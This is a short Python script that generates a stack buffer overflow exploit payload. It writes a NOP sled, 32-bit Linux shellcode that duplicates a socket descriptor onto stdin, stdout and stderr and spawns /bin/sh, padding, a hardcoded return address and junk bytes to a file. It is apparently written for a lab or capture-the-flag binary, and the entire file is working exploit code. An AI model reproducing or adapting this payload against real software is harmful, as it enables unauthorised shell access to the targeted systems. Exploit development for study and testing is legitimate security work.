#!/usr/bin/python3

nopsled = b"\x90" * 60

# shell_payload:
shellcode = b"\x31\xdb\xb3\x03\x31\xc9\xb1\x03\xfe\xc9\x31\xc0\xb0\x3f\xcd\x80\x80\xf9\xff\x75\xf3\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

padding_length = 268 - 60 - len(shellcode)
padding = b"A" * padding_length

# inside the nopsled address now in eip so when we ret we'll go to this value that eip will point to:
eip = b"\x10\xcd\xff\xff"

junk = b"C" * 28

payload = nopsled + shellcode + padding + eip + junk

with open("shell_payload", "wb") as f:
    f.write(payload)
